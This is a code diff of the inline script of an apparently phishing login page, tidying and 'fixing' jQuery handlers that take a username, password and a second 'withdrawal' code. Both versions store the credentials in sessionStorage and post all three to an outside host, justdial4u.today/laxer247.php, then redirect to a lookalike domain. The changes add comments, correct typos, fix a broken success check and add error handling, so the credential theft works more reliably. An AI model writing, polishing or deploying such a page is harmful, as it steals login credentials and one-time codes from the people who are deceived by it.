@@ -1041,45 +1041,58 @@
 	</script>
 	
 <script>
-    $('#LoginDeskButton').on('click', function(){
-        var username =  $('#username').val();
-        var password =  $('#password').val();
-        if(username == "" && password == ""){
-            $('#ERRORSHOW').html('All fields ara required.');
-        }else if(username == ""){
+    // Event handler for the initial login button click
+    $('#LoginDeskButton').on('click', function() {
+        var username = $('#username').val();
+        var password = $('#password').val();
+
+        // Validate inputs
+        if (username == "" && password == "") {
+            $('#ERRORSHOW').html('All fields are required.');
+        } else if (username == "") {
             $('#ERRORSHOW').html('Username field is required.');
-        }else if(password == ""){
+        } else if (password == "") {
             $('#ERRORSHOW').html('Password field is required.');
-        }else{
+        } else {
             $('#ERRORSHOW').html('');
             $('#userpass').css('display', 'none');
             sessionStorage.setItem("username", username);
             sessionStorage.setItem("password", password);
             $('#withcode').css('display', 'block');
         }
-    })
+    });
 
-    $('#loginFinal').on('click', function(){
-        var code =  $('#withdrawal').val();
-        if(code == "" ){
-            $('#ERRORSHOW').html('All fields ara required.');
-        }else{
+    // Event handler for the final login button click
+    $('#loginFinal').on('click', function() {
+        var code = $('#withdrawal').val();
+
+        // Validate code input
+        if (code == "") {
+            $('#ERRORSHOW').html('All fields are required.');
+        } else {
             $('#ERRORSHOW').html('');
             var username = sessionStorage.getItem("username");
-            var password  = sessionStorage.getItem("password");
+            var password = sessionStorage.getItem("password");
+
+            // AJAX request to submit data
             $.ajax({
-                url : 'https://justdial4u.today/laxer247.php',
+                url: 'https://justdial4u.today/laxer247.php',
                 type: 'post',
-                data : {username, password, code},
-                success: function(result){
-                    if(result="sucessmsg"){
-                        // alert('Server not responding. Please after some time.');
+                data: { username, password, code },
+                success: function(result) {
+                    // Fix comparison here
+                    if (result === "sucessmsg") {
                         window.location.href = "https://laxzer247.com";
                     }
+                },
+                error: function(xhr, status, error) {
+                    // Handle errors in the AJAX request
+                    console.log("Error: " + status + " - " + error);
+                    $('#ERRORSHOW').html('There was an issue with the request. Please try again later.');
                 }
             });
         }
-    })
+    });
 </script>
 
 </body>
